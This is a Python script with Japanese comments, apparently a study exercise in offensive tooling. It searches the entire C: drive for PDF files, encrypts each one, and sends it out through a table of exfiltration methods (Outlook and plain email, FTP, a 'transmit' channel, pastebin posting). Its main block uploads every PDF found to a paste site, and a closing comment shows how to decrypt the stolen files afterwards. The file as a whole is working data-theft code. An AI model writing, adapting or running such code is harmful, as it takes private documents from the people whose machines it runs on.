#情報送信を一括りにする
#ここで行った送信をまとめて行う

from cryptor import encrypt
from email_exfil import outlook, plain_email
from transmit_exfil import plain_ftp, transmit
from paste_exfil import ie_paste, plain_paste

import os
from os.path import join, basename

#dictionary dispatch  caseのような扱いが出来る
EXFIL = {
    'outlook': outlook,
    'plain_email': plain_email,
    'plain_ftp': plain_ftp,
    'transmit': transmit,
    'ie_paste': ie_paste,
    'plain_paste': plain_paste,
}

#送信したい文書データを探す PDFを探す
def find_docs(doc_type='.pdf'):
    for parent, _, filenames in os.walk('c:\\'):
        for filename in filenames:
            if filename.endswith(doc_type):
                document_path = join(parent, filename)
                #フルパスを返す
                yield document_path


#パスと送信方法を渡す
def exfiltrate(document_path, method):
    #transmit, plain_ftp などのファイル転送を扱う場合は、エンコードされた文字列ではなく、実際のファイルを用意する為処理を分ける
    if method in ['transmit', 'plain_ftp']:
        filename = f'c:\\windows\\temp\\{basename(document_path)}'
        with open(document_path, 'rb') as f0:
            contents = f0.read()
        with open(filename, 'wb') as f1:
            f1.write(encrypt(contents))

        #関数を実行
        EXFIL[method](filename)
        os.unlink(filename)
    else:
        #ファイルを読み込み
        with open(document_path, 'rb') as f:
            contents = f.read()
        title = basename(document_path)
        contents = encrypt(contents)
        #文字列を送信
        EXFIL[method](title, contents)


if __name__ == '__main__':
    for fpath in find_docs():
        exfiltrate(fpath, 'plain_paste')


#pastebinからダウンロードして複合化
"""
from crypter import decrypt
with open('topo_post_pdf.txt', 'rb') as f:
    contents = f.read()
with open('newtopo.pdf', 'wb') as f:
    f.write(decrypt(contents))
"""